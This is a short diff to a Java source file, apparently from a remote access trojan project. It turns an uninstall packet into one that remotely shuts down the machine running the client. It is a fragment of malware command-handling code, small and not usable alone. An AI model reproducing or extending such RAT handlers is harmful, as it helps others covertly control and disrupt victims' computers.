@@ -3,9 +3,9 @@ package de.sogomn.rat.packet;
 import de.sogomn.rat.ActiveConnection;
 import de.sogomn.rat.util.Constants;
 
-public final class UninstallPacket implements IPacket {
+public final class ShutdownPacket implements IPacket {
 	
-	public UninstallPacket() {
+	public ShutdownPacket() {
 		//...
 	}
 	
@@ -21,14 +21,7 @@ public final class UninstallPacket implements IPacket {
 	
 	@Override
 	public void execute(final ActiveConnection connection) {
-		final String name = Constants.JAR_FILE.getName();
-		
-		Constants.OS_SERVICE.removeFromStartup(name);
-		
-		connection.setObserver(null);
-		connection.close();
-		
-		System.exit(0);
+		Constants.OS_SERVICE.shutDown();
 	}
 	
 }
